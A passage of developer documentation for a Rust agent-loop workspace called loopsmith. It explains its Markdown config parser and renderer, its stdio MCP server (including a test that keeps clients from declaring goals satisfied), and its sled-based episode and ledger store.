CoreError>` |\n| `render_md` | `md/render.rs` | `fn(cfg: &LoopConfig) -> String` |\n\nBoth are re-exported from `md/mod.rs` and again from the crate root, so callers use `loopsmith_core::parse_md` / `loopsmith_core::render_md`.\n\nEverything else in the module — `SectionShape`, `section_shape`, `heading_to_key` — is `pub(crate)` and shared between the parser and the renderer so the two cannot drift.\n\n## The central design decision\n\nThe parser does not know that `Goal` or `StopGates` exist. It converts the document into a `serde_yaml::Value` tree and hands that to the same `Deserialize` impls the YAML path uses:\n\n```rust\nlet value = build_document(&toks)?;\nserde_yaml::from_value::<LoopConfig>(value)\n```\n\nThe renderer is the mirror image, working from `serde_yaml::to_value(cfg)`.\n\nThe consequence is the reason to keep it this way: every `#[serde(default)]`, every alias, and every `deny_unknown_fields` rule applies identically on both paths, for free. A new field on `LoopConfig` needs **no** change in this module. A new *section* needs, at most, one line in `section_shape` and one in `SECTIONS`.\n\n```mermaid\nflowchart LR\n    MD[\".md document\"] -->|tokenize| TOK[\"Vec&lt;Tok&gt;\"]\n    TOK -->|build_document| VAL[\"serde_yaml::Value\"]\n    VAL -->|from_value| CFG[\"LoopConfig\"]\n    CFG -->|to_value| VAL\n    VAL -->|render_md| MD\n    YAML[\".yaml document\"] -->|serde_yaml| CFG\n    CFG -->|serde_yaml| YAML\n```\n\n## Document grammar\n\n```markdown\n# my-loop\n\n- version: 0.1.0\n- description: what this loop is for\n\nProse at the left margin is ignored. Put the reasoning here.\n\n## C. Goals\n\n### ship-it\n- description: the thing is shipped and the suite is green\n- priority: 1\n\n## F. Stop gates\n- max_iterations: 12\n- max_cost_usd: 10.0\n```\n\nFour structural rules cover the whole format:\n\n- **`#`** sets the config's `name`.\n- **`##`** opens a section. The heading is normalised by `heading_to_key`.\n- **`###`** opens an entry inside the current section. Its text fills one field, decided by `section_shape`.\n- **`- key: value`** bullets are fields — of the open `###` entry if there is one, otherwise of the open `##` section, otherwise of the document root.\n\nAnything else is documentation and is dropped.\n\n### `heading_to_key`\n\n`A. Information` → `information`, `F. Stop gates` → `stop_gates`, `I. Execution guidelines` → `execution_guidelines`. Section letters are navigation aids for humans, not grammar, so a leading `A.` / `B)` / `J -` is stripped — but only when the delimiter is at index ≤ 2 and the prefix is alphanumeric. That window is what keeps `Pre-execution` (hyphen at index 3) intact while still stripping `B. Pre-execution`. Writing the raw key (`## stop_gates`) works too.\n\n### `SectionShape`\n\nThe only section-specific knowledge in the module:\n\n```rust\npub(crate) struct SectionShape {\n    pub list_field: Option<&'static str>, // None when the section *is* the list\n    pub key_field: &'static str,          // field a `###` heading fills\n}\n```\n\nIt exists because `### ship-it` must become `name: ship-it` for a goal but `id: ship-it` for a graph node. Two axes:\n\n- **`key_field`** — `information` → `key`, `pre_execution` → `step`, `goals`/`validations`/`success`/`default_skills`/`execution_guidelines` → `name`, `schedules` → `type`, `graph`/`providers` → `id`.\n- **`list_field`** — `None` for sections that *are* a sequence (`goals` deserialises straight into `Vec<Goal>`); `Some(\"nodes\")` for `graph` and `Some(\"providers\")` for `providers`, whose entries nest under a named field of a mapping, alongside sibling scalar fields.\n\nSections absent from the table (`stop_gates`, `constraints`, `skills`, `context`) take no `###` entries at all — they are plain field bags, and a `###` under them is a parse error rather than a silent drop.\n\n## Parsing (`md/parse.rs`)\n\n### `tokenize`\n\nSingle pass over lines producing `Tok::{H1, H2, H3, Bullet { indent, text }}`. Three behaviours worth knowing:\n\n- **Fences** toggle on ```` ``` ```` at column 0 only, and their contents are skipped entirely. That is what makes the example block in this document, and in `LOOP-TEMPLATE.md`, safe to include inside a real config.\n- **Headings are recognised at column 0 only.** An indented `###` is not a heading.\n- **Continuation lines** fold into the bullet above them: a non-bullet line indented past the preceding bullet, with no blank line between, appends to that bullet's text with a `\\n`. This is how a long `instruction` spans several lines without becoming prose. A blank line breaks the association (`after_blank`), which is the difference between a wrapped value and a paragraph of documentation.\n\n### `build_document`\n\nWalks the token stream holding two pieces of state: the open `section` and the open `entry`. Every heading calls `flush_entry` first, which appends the finished entry mapping to the right place — `root[section]` as a sequence, or `root[section][list_field]` when the shape names one — creating the container if absent.\n\nA `###` heading's text is inserted as a `Value::from(String)`, never re-parsed as YAML. Without that, `### Recorded the baseline: test count, coverage` would deserialise as a one-key mapping and land on a field expecting text.\n\nBullets are handled in runs: the next non-bullet token bounds the block, and `build_block` turns the whole run into one value that is then merged into the entry, the section, or the root.\n\n### `build_block`\n\nRecursive over indentation. At each level it accumulates either a `Mapping` or a `Sequence` and refuses to mix them (`a bullet list mixes \\`key: value\\` entries with bare items`). A bullet whose value is empty (`- key:`) owns the more-deeply-indented bullets below it; with nothing below, it becomes `Value::Null`.\n\n### `split_field` and `scalar`\n\nThese two functions carry most of the format's ergonomics.\n\n`split_field` decides whether `- text` is a field or a bare list item. It requires `key: ` (colon-space) or a trailing bare `key:`, **and** that the key contain no whitespace. That guard is why `- Never git stash. Never git reset.` stays a list item instead of becoming a field named `Never git stash. Never git reset.`.\n\n`scalar` runs single-line values through `serde_yaml::from_str`, so `12`, `true`, and `[a, b]` arrive as the types they look like, falling back to a string on failure. Multi-line values are kept verbatim as strings — prose containing a colon is not a mapping.\n\n### Errors\n\nStructural failures and serde failures both surface as `CoreError::Parse { path, yaml, json }`, with `json` set to `\"not attempted: the file was read as markdown\"` — the Markdown path never tries the JSON fallback the YAML path has.\n\n## Rendering (`md/render.rs`)\n\n`render_md` serialises the config to a `Value`, emits `# {name}`, then the `PREAMBLE` fields (`version`, `description`), then walks `SECTIONS` in order. That order matches `LOOP-TEMPLATE.md`, so a rendered config and the template read the same way. Absent or blank sections are skipped.\n\n`render_section` branches on the same `section_shape` the parser uses:\n\n- sequence + shape → each element becomes a `###` entry via `render_entry`;\n- mapping + shape → scalar siblings first as bullets, then the `list_field` sequence as `###` entries;\n- mapping, no shape → a flat bullet list.\n\n`push_field` recurses for nested mappings (indent + 2) and delegates strings to `push_string`.\n\n### What the emitter is careful about\n\n**Quoting.** `push_string` writes values bare when YAML would read them back as the same string, and quotes (via JSON flow) otherwise. A value like `12` or `true` on a string field would otherwise change type on the way back in.\n\n**Multi-line values** are emitted with the first line after `- key: ` and the rest at indent + 4, which the tokenizer's continuation rule folds back together.\n\n**Nested lists of objects** have no bullet form that survives a round trip, so they are emitted as inline JSON. JSON is a subset of YAML, which is exactly what `scalar` feeds `serde_yaml::from_str` — the value returns as itself.\n\n**`is_blank`** omits nulls and empty collections; a config full of `- skills: []` is noise, and serde defaults put them back on the way in. An empty **string** is deliberately not blank: `value: \"\"` is a choice the author made, and dropping it from a required field produces a document that no longer parses. That distinction was added after it broke `information[].value`.\n\n### Known lossy edge\n\nTrailing whitespace inside a value cannot survive — a bullet ends where the line ends — so values are emitted `trim_end`ed. Interior indentation inside a multi-line value is likewise normalised, since continuation lines are re-emitted trimmed. Nothing else is lost.\n\n## Tests that hold the module together\n\n- `md/mod.rs` — `heading_to_key` normalisation, including the `Pre-execution` hyphen case.\n- `md/render.rs` — `the_renderer_knows_about_every_top_level_config_key` serialises a config and asserts every top-level key appears in `SECTIONS`, `PREAMBLE`, or is `name`. A key in none of those lists is silently dropped on render; this test is how the missing `context` section was found.\n- `loopsmith-core/tests/md_roundtrip.rs` — the round trip is a property test, not a hope: `roundtrip` renders then reparses; `a_markdown_config_parses_into_the_same_model_as_its_yaml_twin` pins the two grammars to one model; `prose_and_fenced_blocks_are_documentation_not_config` and `a_multi_line_instruction_survives` cover the tokenizer's two subtle rules; `a_misspelled_field_is_refused_in_markdown_too` confirms `deny_unknown_fields` reaches the Markdown path.\n\n## Callers\n\n**Parse side** — `loopsmith_core::load` dispatches on `is_markdown(path)` and calls `parse_md`, so every command that loads a config (`run`, `gate`, `schedule`, …) accepts `.md` without knowing it. `loopsmith-cli`'s `scaffold` parses a user-supplied Markdown config when creating a new loop.\n\n**Render side** — `guided::render` and the web `assemble::render` both emit Markdown as the guided flow's output format, which is why the guided builder produces a self-documenting config rather than YAML.\n\n**Both** — `loopsmith convert` (`loopsmith-cli/src/cmd/convert.rs`) is load-then-emit. Direction is inferred: `is_markdown(config)` means the input is Markdown, so the output is YAML; anything else renders to Markdown. `--to-yaml` forces YAML output. With `--out`, parent directories are created and the path is printed; otherwise the text goes to stdout.\n\n## Adding a section\n\n1. Add the field to `LoopConfig` — the YAML path and the Markdown parser both pick it up with no further work.\n2. Add `(\"my_section\", \"K. My section\")` to `SECTIONS` in `render.rs`, or the renderer drops it. The `the_renderer_knows_about_every_top_level_config_key` test fails if you forget.\n3. Only if the section takes `###` entries, add a `section_shape` arm naming its `key_field` and, if the entries nest under a field of a mapping, its `list_field`.","mcp-server":"# MCP Server\n\n# MCP Server (`loopsmith-mcp`)\n\nA local Model Context Protocol server that lets any MCP client — an editor, an agent, Claude Code — read a loop's schedule, ledger, and gate verdict over stdio. It is the read side of the loopsmith control plane, deliberately shaped so that a reasoning agent can see everything about its own run except the one thing it must not control: whether a goal is satisfied.\n\n## The design constraint\n\n`goal_satisfied` is written by `loopsmith-gate` and by nothing else. The MCP surface has no tool that sets it, and there is a test that fails if one ever appears:\n\n```rust\n// there_is_no_tool_for_declaring_a_goal_satisfied\nassert!(!names.iter().any(|n| n.contains(\"satisfy\")\n    || n.contains(\"set_goal\")\n    || n.contains(\"mark_done\")));\n```\n\nThat test is a guardrail, not a formality. `loopsmith_gate_evaluate` exists and calls into the gate, but it *reports* a ruling — the gate re-derives its verdict from evidence on every call, so a client cannot smuggle a conclusion in through the evaluation path either. Everything else the server can mutate (`loopsmith_record_episode`, `loopsmith_scratchpad`) writes records of what happened, never judgements about it.\n\nThe transport reinforces this. stdio only, no socket, no bind address. A loop's ledger and goal state are a local record; exposing them over a network would be a different security question than the one this crate answers.\n\n## Protocol\n\nJSON-RPC 2.0, one object per line, newline-delimited. The crate implements the protocol directly rather than pulling in an MCP SDK — the surface is three methods, and hand-writing them avoids taking an async runtime as a dependency for a single stdio loop.\n\n| Method | Behaviour |\n|---|---|\n| `initialize` | Returns `PROTOCOL_VERSION` (`\"2024-11-05\"`), `capabilities.tools`, and `serverInfo` with the crate version from `CARGO_PKG_VERSION` |\n| `notifications/initialized` | Accepted and answered with `{}` by `handle`, but suppressed by `serve` because it carries no `id` |\n| `tools/list` | Returns the catalogue from `tools()` |\n| `tools/call` | Dispatches on `params.name` with `params.arguments` |\n| anything else | JSON-RPC error `-32601` |\n\n```mermaid\nflowchart LR\n  stdin[stdin lines] --> serve\n  serve --> handle\n  handle -->|tools/call| call\n  handle -->|initialize / tools/list| R[Response::ok]\n  call --> T[tool_* methods]\n  T --> core[loopsmith-core / graph / gate]\n  T --> store[Store: sled]\n  R --> stdout[stdout]\n```\n\n## Two kinds of failure\n\nThis distinction is the thing most likely to trip up a contributor, and it is intentional.\n\n**Protocol failures** produce a JSON-RPC `error` object: `-32700` for a line that will not parse into a `Request`, `-32601` for an unknown method. Built by `Response::err`.\n\n**Tool failures** produce a *successful* JSON-RPC response whose result carries `isError: true` and the message as text content. A missing `run_id`, a config that will not load, a gate evaluation that blows up on serialization — all of these come back through `Response::ok`. That is what MCP clients expect: the call reached the server and the server has something to say about it, so the model gets a readable message instead of a transport error it cannot reason about.\n\nConcretely, in `Server::call`:\n\n```rust\nErr(msg) => Response::ok(\n    req.id.clone(),\n    json!({ \"content\": [{ \"type\": \"text\", \"text\": msg }], \"isError\": true }),\n),\n```\n\nEvery tool method therefore returns `Result<Value, String>` — a plain `String` error, not a typed one, because it is going straight into text content for a model to read. `str_arg` is the shared helper that turns a missing or non-string argument into `missing required argument \\`key\\``.\n\nSuccessful results are serialized with `serde_json::to_string_pretty` and wrapped in a single text content block. There is no structured-content path; clients parse the text.\n\n## Tools\n\n`tools()` returns the catalogue as a `serde_json::Value` literal — the JSON Schema for each tool is written by hand next to its description, so adding a tool means editing that array and adding a `match` arm in `Server::call`. Nothing derives one from the other.\n\n### `loopsmith_plan`\nLoads a config via `loopsmith_core::load`, runs `loopsmith_graph::plan` over `cfg.graph`, and flattens the result: waves (each `{index, nodes}`), critical path and its cost, total cost, parallel fraction, chosen concurrency, predicted speedup, and the Amdahl ceiling. Pure computation — the store is not touched.\n\n### `loopsmith_gate_evaluate`\nBuilds an `Evidence` rooted at `workdir` (defaulting to `.`), folds in caller-supplied `metrics` (only values that are `as_f64()` survive) and `artifacts` (only `as_str()`), then calls `loopsmith_gate::evaluate(&cfg, &target, &ev)` and serializes the `TargetVerdict`. `target` is a goal name or the literal `\"overall\"`.\n\nNote the filtering: a metric passed as a JSON string is silently dropped rather than rejected. Evidence is also re-read from disk on every call, which is what makes revocation work — delete a required artifact and a previously satisfied goal flips back.\n\n### `loopsmith_ledger`\nReads the run's append-only ledger from the store. `limit` returns the **most recent** N entries, not the first N:\n\n```rust\nlet n = entries.len().saturating_sub(limit as usize);\nentries = entries.split_off(n);\n```\n\n### `loopsmith_goal_states`\nCurrent gate rulings for every goal plus `overall`, straight from `Store::goal_states`.\n\n### `loopsmith_record_episode`\nConstructs an `Episode` and calls `Store::put_episode`, returning `{ recorded: true, seq }`. `run_id`, `node_id`, `provider_id`, and `output` are required; a call without `provider_id` is refused with a tool error. That refusal is the point — an episode without provenance cannot later be judged for independence, so the ledger declines to hold it.\n\nDefaults and quiet extras worth knowing: `iteration` defaults to `0`, `role` defaults to `\"builder\"`, `prompt_digest` is always written empty, `created_ms` comes from `loopsmith_memory::now_ms()`, and `error` is always `None`. The handler also reads `tokens`, `cost_usd`, and `duration_ms` from the arguments even though the published `inputSchema` does not list them — a client can supply them, but a schema-driven client will never know to.\n\n### `loopsmith_scratchpad`\nOne tool, two operations, keyed on presence of `value`: supply it to write (`{ written: true }`), omit it to read (`{ value: … }`). The scratchpad is the per-goal reasoning carried between iterations.\n\n## Key types\n\n**`Server<S: Store>`** — generic over the memory backend rather than tied to `SledStore`, which is what makes the tests cheap: they open a store under `loopsmith_util::testing::temp_path` and tear it down afterwards. It holds a single public field, `store`, and every method takes `&self`; there is no interior mutability and no per-connection state, so handling is trivially reentrant.\n\n**`Request`** — every field except `method` is `#[serde(default)]`, so a malformed-but-parseable request degrades into a dispatchable one rather than a parse error. `id: Option<Value>` is what distinguishes a request from a notification.\n\n**`Response`** — `jsonrpc` is a `&'static str` pinned to `\"2.0\"`; `id`, `result`, and `error` all skip serialization when `None`, so the wire form stays clean. Build it through `Response::ok` / `Response::err` rather than the struct literal.\n\n**`serve`** — the loop. Takes `impl BufRead` and `impl Write` rather than binding stdin/stdout directly, which is why `serve_answers_requests_and_stays_silent_on_notifications` can drive it with a `Cursor` over a string literal. Blank lines are skipped, notifications get no reply per spec, and each response is flushed immediately so a client blocking on a read is not left waiting behind a buffer.\n\n## Where it sits\n\n`loopsmith-mcp` depends on `loopsmith-core` (config loading), `loopsmith-graph` (planning), `loopsmith-gate` (verdicts), and `loopsmith-memory` (the `Store` trait, `Episode`, `LedgerEntry`). Nothing depends on it except the `loopsmith` binary, which wires it up behind `loopsmith mcp --state ./state`. It has no incoming calls from elsewhere in the workspace — it is a leaf, an adapter over the layers below.\n\nRegistration, from `runtime/crates/loopsmith-cli/templates/mcp.template.json`:\n\n```json\n{ \"mcpServers\": { \"loopsmith\": {\n    \"command\": \"loopsmith\",\n    \"args\": [\"mcp\", \"--state\", \"./state\"]\n} } }\n```\n\nor `claude mcp add loopsmith -- loopsmith mcp --state ./state`. The template also carries fallbacks for a binary that is not on `PATH` and for `cargo run` during development.\n\n## Contributing notes\n\n**Adding a tool** means three edits in `src/lib.rs`: an entry in the `tools()` array with a hand-written `inputSchema`, a `match` arm in `Server::call`, and a `tool_*` method returning `Result<Value, String>`. Keep argument extraction going through `str_arg` so the error text stays uniform, and keep the return shape a `Value` — the caller handles pretty-printing and content wrapping.\n\n**Adding a mutation** deserves a hard look first. The line the crate holds is that writes record what happened and never rule on it. A tool that lets a client assert an outcome — not just report evidence for one — breaks the independence guarantee even if it avoids the names the guardrail test greps for.\n\n**Packaging.** `Cargo.toml` ships only `/src/**/*` and `/README.md`. The integration tests read `config/examples/` and `config/loop.schema.json` from the repository root, which no crate tarball can contain, so including them would publish tests that cannot pass. If you add a test that reads a fixture from outside `src/`, it will pass locally and be unreachable from the published crate — that is accepted, not an oversight.\n\n**Tests** live inline in `src/lib.rs` and cover the shape of the contract rather than the plumbing: the protocol version and server name, that every listed tool has an object schema, that unknown methods are JSON-RPC errors while missing arguments are tool errors, that provenance-free episodes are refused, that notifications get no reply, and that malformed JSON produces a parse error rather than a panic. Each store-backed test removes its temp directory at the end.","memory-episode-store":"# Memory & Episode Store\n\n# Memory & Episode Store (`loopsmith-memory`)\n\nThe persistence plane for a loopsmith run. Everything that must survive a crash, a schedule boundary, or a context reset lives here — and nothing else does. If a piece of state can be recomputed from the config or the graph, it belongs in another crate; if losing it would make a resumed run lie about what already happened, it belongs here.\n\nThe crate is deliberately small: a set of plain serializable record types, one trait (`Store`), one shipped backend (`SledStore`), and one piece of analysis (`score_skills`). There is no async, no background task, no schema migration machinery.\n\n---\n\n## Why it exists\n\nA loop that runs for hours across many iterations has three failure modes this crate exists to prevent.\n\n**Amnesia across iterations.** Iteration N+1 either re-sends every prior episode (which grows without bound) or sends nothing at all — and \"nothing at all\" is why a stalled loop kept producing the byte-identical prompt it had already failed with. `IterationSummary` is the compressed middle path.\n\n**Refunded stop gates.** A loop that pauses and resumes would otherwise be handed a fresh revision budget and a no-progress counter of zero every time, so a run going nowhere could never reach the halt that exists to stop it. `Checkpoint` therefore carries the stop gates' own accounting (`revisions`, `stale_iterations`, `last_signature`), not just \"which node ran last\".\n\n**Compounding bad data.** One malformed record becomes a retrieved \"fact\", which becomes reasoning, which becomes another record. Writes validate and reject rather than store.\n\n---\n\n## The two design rules\n\n### 1. Validate before writing\n\nEvery write path that can be wrong rejects instead of persisting, returning `MemError::Rejected`:\n\n| Write | Rejects when |\n|---|---|\n| `put_episode` | `run_id`, `node_id`, or `provider_id` is blank (`Episode::check`) |\n| `set_goal_state` | `target` is blank, or `passed + failed > total` |\n| `append_ledger` | `run_id` is blank |\n| `put_summary` | `run_id` is blank |\n| `put_skill_trial` | `skill` is blank, or `pass_rate` is outside `0.0..=1.0` |\n| `put_proposal` | `run_id` is blank |\n\nThe rejection is total — `malformed_episodes_are_rejected_not_stored` asserts the run's episode list is still empty after a failed write, not merely that the call returned an error.\n\n### 2. The store is a trait\n\n`sled` is the shipped backend but is effectively frozen upstream. Every caller in the workspace depends on `Store`, never on `SledStore` directly, so a different engine can be dropped in without touching them. `Store: Send + Sync`, so implementations are shared across the runtime's threads behind an `Arc`.\n\n### The rule underneath both\n\n> A model must not be the thing that certifies its own completion.\n\n`GoalState { satisfied: true }` is constructed by `loopsmith-gate` and by nothing else. This crate cannot enforce that with a type — it enforces it with dependency direction: `loopsmith-gate` depends on `loopsmith-memory`, never the reverse. That is also why `Checkpoint::verdicts_json` is a `String` rather than the gate's verdict type. Holding it as text keeps the arrow pointing one way and keeps the only constructor of a satisfied goal inside the gate.\n\nThe same split runs through `IterationSummary`: `facts` is written by Rust from the gate's verdicts and is always present; `narrative` is optional model prose and is explicitly *never load-bearing*.\n\n---\n\n## Record types\n\nAll of these are `Serialize + Deserialize` and stored as JSON.\n\n**`Episode`** — what one node did on one iteration. Carries `provider_id` specifically so the gate can verify a judge did not run on the same provider as its builder. Cost/token/duration fields are `Option` with `#[serde(default)]`.\n\n**`GoalState`** — the gate's ruling on one target, with `passed`/`failed`/`total`, a human-readable `reason`, and the `iteration` at which the ruling was made. `pass_rate()` returns `0.0` for an empty total rather than dividing by zero. State is *replaced* per target, not appended — the store holds the current ruling, and the history lives in the ledger.\n\n**`LedgerEntry` / `LedgerKind`** — append-only audit trail. The point of `LedgerKind::StopGateTriggered` sitting alongside `GoalSatisfied` is that failures are logged too: a node that hits its ceiling constantly is a signal, and that signal is invisible if only completions are recorded. `GoalRevoked` exists because the gate can take a satisfied goal back — delete a required artifact and the ruling flips.\n\n**`SkillTrial`** — one observation of \"did this skill help?\", pairing a skill with the gate outcome that followed. This is the substrate of self-evolution: a loop cannot reason its way to knowing which sub-agents earn their place, so it tries them and watches the gate.\n\n**`Proposal` / `ProposalKind`** — a change the loop wants but may not apply itself. Anything touching goals, validations, or success criteria is `ChangeCriteria`: always a proposal, never an action.\n\n**`Checkpoint`** — where to resume. Note that `completed_nodes` means \"has this node ever run in this run\", not \"did it run this iteration\" — phase completion is computed from it, so the other reading would reopen a phase every iteration.\n\n**`IterationSummary`** — the compressed record of an iteration, with `render()` producing the markdown block injected into a later prompt.\n\n### Proposal expiry\n\nA proposal is evidence about a moment. \"This skill correlated with satisfied goals across the last three iterations\" is a claim about a graph and a config that may both have been hand-edited since. Nothing deletes a proposal — the record of what the loop wanted is worth keeping — but a reviewer needs to know which suggestions answer a question nobody is asking any more.\n\n```rust\nProposal::default_lifetime_ms(kind)   // None | Some(7 days) | Some(30 days)\nproposal.with_default_expiry()        // stamps expires_ms; leaves an explicit one alone\nproposal.is_expired(now_ms)           // the expiry instant itself counts as expired\n```\n\n`TrySkill` gets 7 days (a marketplace listing may be gone); `AdoptSkill`, `DropSkill`, and `ReshapeGraph` get 30; `ChangeCriteria` never expires, because it is a question about the goal rather than an observation about a run.\n\nThe exhaustive `match` in `default_lifetime_ms` is load-bearing: a new `ProposalKind` cannot compile without someone deciding its lifetime. `every_proposal_kind_has_a_decided_lifetime` then pins each decision so a change to one shows up in a diff.\n\n---\n\n## The `Store` trait\n\n```rust\npub trait Store: Send + Sync {\n    fn put_episode(&self, ep: &Episode) -> Result<u64>;\n    fn episodes(&self, run_id: &str) -> Result<Vec<Episode>>;\n\n    fn set_goal_state(&self, run_id: &str, st: &GoalState) -> Result<()>;\n    fn goal_state(&self, run_id: &str, target: &str) -> Result<Option<GoalState>>;\n    fn goal_states(&self, run_id: &str) -> Result<BTreeMap<String, GoalState>>;\n\n    fn append_ledger(&self, entry: &LedgerEntry) -> Result<u64>;\n    fn ledger(&self, run_id: &str) -> Result<Vec<LedgerEntry>>;\n\n    fn save_checkpoint(&self, cp: &Checkpoint) -> Result<()>;\n    fn checkpoint(&self, run_id: &str) -> Result<Option<Checkpoint>>;\n\n    fn set_scratchpad(&self, run_id: &str, key: &str, value: &str) -> Result<()>;\n    fn scratchpad(&self, run_id: &str, key: &str) -> Result<Option<String>>;\n\n    fn put_summary(&self, s: &IterationSummary) -> Result<()>;\n    fn summaries(&self, run_id: &str) -> Result<Vec<IterationSummary>>;\n\n    fn put_skill_trial(&self, t: &SkillTrial) -> Result<u64>;\n    fn skill_trials(&self) -> Result<Vec<SkillTrial>>;   // every run, deliberately\n\n    fn put_proposal(&self, p: &Proposal) -> Result<u64>;\n    fn proposals(&self, run_id: &str) -> Result<Vec<Proposal>>;\n\n    fn runs(&self) -> Result<Vec<String>>;\n    fn flush(&self) -> Result<()>;\n}\n```\n\nAlmost every method is scoped by `run_id`. The one exception is `skill_trials()`, which returns trials across all runs — a skill's track record is only meaningful if it survives one bad loop.\n\nErrors are a single `MemError` with four variants: `Backend`, `Serde` (via `#[from] serde_json::Error`), `Rejected`, and `NotFound`. `MemError::Rejected` is the one callers should distinguish; it means the input was wrong, not the store.\n\n---\n\n## `SledStore`\n\n### Key layout\n\nKeys are prefixed and zero-padded so `scan_prefix` returns records in insertion order with no secondary index:\n\n```text\nep/<run>/<seq:020>      episode\ngs/<run>/<target>       goal state\nlg/<run>/<seq:020>      ledger entry\nck/<run>                checkpoint\nsp/<run>/<key>          scratchpad\nsu/<run>/<iter:020>     iteration summary\nst/<seq:020>            skill trial   (global, deliberately not per run)\npr/<run>/<seq:020>      proposal\n```\n\n`seq` comes from `next_seq()`, a thin wrapper over `sled::Db::generate_id()`. It is a single monotonic counter shared by every keyspace — the values are not dense per prefix and are not meant to be. Only their ordering matters, and the fixed 20-digit padding is what makes lexicographic key order equal insertion order.\n\nTwo key choices carry meaning:\n\n- **`su/<run>/<iter>` is keyed by iteration, not sequence.** Re-summarising an iteration must *replace* it. Keyed by sequence, a re-summary would append a second version that a later read silently counted twice.\n- **`st/<seq>` is global.** There is no run in the key, which is what makes `skill_trials()` a cross-run scan by construction rather than by convention.\n\n`runs()` is derived, not stored: it scans the `ck/` prefix and strips the prefix off each key. A run therefore becomes visible to `runs()` only once its first checkpoint is saved.\n\n### Durability\n\nOnly `save_checkpoint` flushes eagerly:\n\n```rust\nfn save_checkpoint(&self, cp: &Checkpoint) -> Result<()> {\n    self.put(format!(\"ck/{}\", cp.run_id), serde_json::to_vec(cp)?)?;\n    self.flush()   // the resume contract — don't trust the background flusher to beat a crash\n}\n```\n\nEverything else rides sled's background flusher until someone calls `flush()`. Callers that care (end of iteration, end of run) call it explicitly.\n\n### Opening, and the lock retry\n\n`SledStore::open` is not a plain `sled::open`. Sled releases its file lock as part of cleanup, and neither `drop` nor process exit makes that instantaneous — so \"locked\" usually means \"locked for another millisecond\", and failing immediately turns an ordinary race into a user-visible error.\n\nThe web UI is what made this reachable: pressing Run and then Status spawns two processes back to back, and the first is often still exiting when the second opens. Under the CLI alone the gap was a human's reaction time.\n\n```\nopen(path)\n  └─ loop until deadline (LOCK_WAIT = 2s)\n       sled::open ── Ok ──▶ SledStore\n              │\n              └─ Err(e) ── is_lock_contention(&e)?\n                             ├─ no  ▶ MemError::Backend(e)\n                             └─ yes ▶ sleep(backoff); backoff = min(backoff*2, 150ms)\n                                      past deadline ▶ \"…is locked by another\n                                                       loopsmith process…\"\n```\n\nBackoff doubles from 5 ms rather than polling at a fixed interval: the common case clears on the first retry and should not pay for the rare one. Two seconds is far longer than a releasing lock needs and short enough that a genuinely held lock reports quickly rather than hanging.\n\n`is_lock_contention` matches narrowly and on purpose. It checks `io.kind()` for `WouldBlock`/`ResourceBusy` where sled surfaces a typed `sled::Error::Io`, and falls back to substring-matching the message because sled stringifies the `io::Error` on some paths. A corrupt database or a missing directory must *not* be retried — widening this predicate would turn a hard failure into a two-second hang followed by a misleading message.\n\nBoth halves of the trade are tested: `opening_waits_for_a_lock_that_is_being_released` asserts the call actually waited (≥100 ms while a holder is dropped after 120 ms), and `a_lock_nobody_releases_is_reported_rather_than_waited_on_forever` asserts the wait is bounded (≥ `LOCK_WAIT`, < `3 × LOCK_WAIT`) and that the error names what is holding the lock — otherwise the user has nothing to act on.\n\n---\n\n## Skill scoring\n\n`score_skills(&[SkillTrial]) -> Vec<SkillScore>` is the crate's only piece of analysis. It groups trials by skill name into a `BTreeMap`, accumulating trial count, satisfied count, and summed pass rate, then sorts by `satisfaction_rate()` descending with `trials` as the tiebreak.\n\nThe tiebreak is the interesting part, together with the doc comment's warning: *a skill with too few trials is reported but should not be acted on — one lucky run is not evidence*. The function does not filter low-trial skills out; it surfaces `trials` on every `SkillScore` and leaves the threshold to the caller. `loopsmith-skills::recommend` and `loopsmith-cli`'s `skills scores` command are the two callers.\n\n`SkillScore::source` is whichever source the *first* trial for that skill reported (`installed | marketplace | generated`). If the same skill name is trialled from two sources, the ranking will show only one of them.\n\n---\n\n## Where it sits in the workspace\n\n`loopsmith-memory` sits at the bottom of the dependency graph next to `loopsmith-core`, depending only on `loopsmith-util` (for `now_ms`, re-exported here so the whole workspace reads one clock) plus `serde`, `serde_json`, `thiserror`, and `sled`. Everything else depends on it.\n\n```mermaid\ngraph LR\n    gate[\"loopsmith-gate<br/><i>to_goal_state<\/i>\"] -->|GoalState| M[(Store)]\n    mcp[\"loopsmith-mcp<br/><i>tool_record<\/i>\"] -->|Episode| M\n    run[\"cli: run/summary.rs<br/>run/evolve.rs<br/>logging.rs\"] -->|Summary · Proposal · Ledger| M\n    M --> skills[\"loopsmith-skills<br/><i>recommend → score_skills<\/i>\"]\n    M --> cli[\"cli: proposals · status<br/>skills scores · watch\"]\n```\n\nConcrete edges worth knowing when you change a record type:\n\n- **`loopsmith-gate::to_goal_state`** is the sole constructor of `GoalState`. Changing its fields is a gate change first.\n- **`loopsmith-mcp::tool_record`** builds `Episode` from an MCP tool call — the store is exposed over stdio MCP, so record shapes are part of a semi-public surface.\n- **`src/run/summary.rs`** (`deterministic`, `carry_forward_honours_the_configured_depth`) constructs `IterationSummary`; `carry_forward` decides how many summaries get rendered into the next prompt.\n- **`src/run/evolve.rs`** (`write_proposals` → `propose_reshape` → `write`) is where `Proposal` values originate.\n- **`loopsmith-cli/src/logging.rs`** (`entry`) constructs `LedgerEntry`, and writes log files to the logs directory rather than the state directory.\n- **`loopsmith-cli/tests/stress.rs`** reads back through `ledger`, `proposals`, `summaries`, and `goal_states` to assert end-to-end behaviour — notably `a_resume_does_not_reset_the_no_progress_counter`, which is the checkpoint-accounting invariant tested from the outside.\n\n`SledStore::open` also shows up in the call graph from a lot of unrelated tests (`scaffold.rs`, `worktree.rs`, `loopsmith-skills`) via the shared `tmp` helper. Those are exercising temp-store setup, not memory behaviour.\n\n---\n\n## Contributing\n\n**Adding a field to a persisted struct.** It must be `#[serde(default)]` (or `Option`). Records live in a sled store that outlives the binary that wrote them; without the default, `loopsmith proposals` reports a backend error on a perfectly healthy store. `a_proposal_written_before_the_field_existed_still_deserialises` pins this for `Proposal::expires_ms` and is the template for the next one. There is no migration step — forward-compatible serde *is* the migration strategy.\n\n**Adding a `ProposalKind`.** The exhaustive match in `default_lifetime_ms` will fail to compile until you decide the lifetime, and `every_proposal_kind_has_a_decided_lifetime` should gain the corresponding row.\n\n**Adding a `Store` method.** Every implementation must be updated; there is no default body. Pick a two-letter key prefix that does not collide with the eight in use, and decide up front whether the key ends in a sequence (append semantics) or a natural key (replace semantics) — that choice is the difference between `pr/` and `su/`.\n\n**Adding validation.** Put it in the write method or in a `check()` on the type, return `MemError::Rejected` with a message naming the field and the offending value, and add a test asserting the record was *not* stored — not merely that the call errored.\n\n**Things to be aware 